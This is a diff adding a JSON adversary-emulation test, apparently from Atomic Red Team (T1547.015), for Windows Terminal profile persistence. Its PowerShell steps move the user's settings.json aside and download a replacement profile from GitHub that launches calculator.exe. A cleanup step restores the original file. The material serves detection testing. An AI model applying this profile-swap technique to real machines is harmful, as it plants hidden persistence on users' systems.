@@ -1,0 +1,123 @@
+{
+  "id": "ec5d76ef-82fe-48da-b931-bdb25a62bc65",
+  "name": "Persistence by modifying Windows Terminal profile",
+  "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "92b807fc-e2eb-44b9-b8eb-7800ecd7c7a3",
+      "type": "execute-command",
+      "data": {
+        "command": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "12d0db8c-8f96-4133-9aee-8acfba9ae1c9",
+      "type": "execute-command",
+      "data": {
+        "command": "mv -Force #{settings_json_tmp} #{settings_json_def}\ntaskkill /F /IM \"#{calculator}\" \u003e $null\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "57b926b0-5eee-42d0-b2b4-96c80c5514d6",
+      "name": "Check dependency 1/1",
+      "description": "Windows Terminal must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{wt_exe}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fb7c021a-4677-4551-8832-f5680d08589b",
+      "name": "Resolve dependency 1/1",
+      "description": "Windows Terminal must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$(rm ~\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\LocalState\\StoreEdgeFD\\installed.db -ErrorAction Ignore; Write-Output \"\"; $?) -and $(winget install --id=Microsoft.WindowsTerminal)\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b92b2d31-bd31-42ad-a32b-50c2b69d6317",
+      "name": "Re-check dependency 1/1",
+      "description": "Windows Terminal must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{wt_exe}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "92b807fc-e2eb-44b9-b8eb-7800ecd7c7a3",
+      "p": "on-success",
+      "o": "12d0db8c-8f96-4133-9aee-8acfba9ae1c9"
+    },
+    {
+      "s": "92b807fc-e2eb-44b9-b8eb-7800ecd7c7a3",
+      "p": "on-failure",
+      "o": "12d0db8c-8f96-4133-9aee-8acfba9ae1c9"
+    },
+    {
+      "s": "57b926b0-5eee-42d0-b2b4-96c80c5514d6",
+      "p": "on-success",
+      "o": "92b807fc-e2eb-44b9-b8eb-7800ecd7c7a3"
+    },
+    {
+      "s": "57b926b0-5eee-42d0-b2b4-96c80c5514d6",
+      "p": "on-failure",
+      "o": "fb7c021a-4677-4551-8832-f5680d08589b"
+    },
+    {
+      "s": "fb7c021a-4677-4551-8832-f5680d08589b",
+      "p": "on-success",
+      "o": "b92b2d31-bd31-42ad-a32b-50c2b69d6317"
+    },
+    {
+      "s": "b92b2d31-bd31-42ad-a32b-50c2b69d6317",
+      "p": "on-failure",
+      "o": "92b807fc-e2eb-44b9-b8eb-7800ecd7c7a3"
+    }
+  ],
+  "tags": [
+    "T1547.015",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "calculator",
+      "type": "string",
+      "description": "Test program used to imitate a maliciously called program.",
+      "value": "calculator.exe"
+    },
+    {
+      "name": "settings_json_def",
+      "type": "path",
+      "description": "Default file for Windows Terminal to replace the default profile with a backdoor to call another program.",
+      "value": "~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"
+    },
+    {
+      "name": "settings_json_tmp",
+      "type": "path",
+      "description": "Temp file for Windows Terminal.",
+      "value": "~\\AppData\\Local\\Temp\\settings.json"
+    },
+    {
+      "name": "wt_exe",
+      "type": "path",
+      "description": "Windows Terminal executable.",
+      "value": "~\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\wt.exe"
+    }
+  ]
+}
